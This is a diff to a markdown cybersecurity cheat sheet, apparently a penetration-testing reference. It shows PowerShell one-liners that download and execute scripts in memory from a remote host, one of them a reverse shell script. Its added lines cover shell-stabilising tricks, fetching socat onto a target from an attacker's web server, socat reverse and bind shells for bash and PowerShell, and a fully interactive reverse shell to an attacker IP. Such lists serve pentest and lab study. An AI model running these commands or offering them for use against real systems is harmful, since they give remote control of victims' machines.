@@ -42,10 +42,34 @@ List of tools/resources for Cybersecurity
   - ```iex (New-Object Net.WebClient).DownloadString('https://192.168.2.2/reverse.ps1')``` -> Download in-memory
   - ```$down = [System.NET.WebRequest]::Create("http://192.168.2.2/file.ps1"); $read = $down.GetResponse(); IEX ([System.lO.StreamReader]($read.GetResponseStream())).ReadToEnd()``` -> Download in-memory
   - ``` 
-    Stabilize Shell
+    Stabilize Shell #1
     python -c 'import pty;pty.spawn("/bin/bash")'
     export TERM=xterm #Ctrl+Z
     stty raw -echo; fg
+
+
+    Stabilize Shell #2 rlwrap
+    rlwrap nc -lvnp <port>
+    stty raw -echo; fg
+
+    Stabilize Shell #3 Socat
+    sudo python3 -m http.server 80
+    wget <LOCAL-IP>/socat -O /tmp/socat
+    Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe
+
+    Reverse Shell   
+    socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
+    socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
+
+    Bind Shell
+    socat TCP-L:<PORT> EXEC:powershell.exe,pipes
+    socat TCP-L:<PORT> EXEC:"bash -li"
+
+    Stable Linux Shells
+    socat TCP-L:<port> FILE:`tty`,raw,echo=0
+
+    Final Stable linux shell
+    socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
     ```
   - JavaScript Shell
     ```
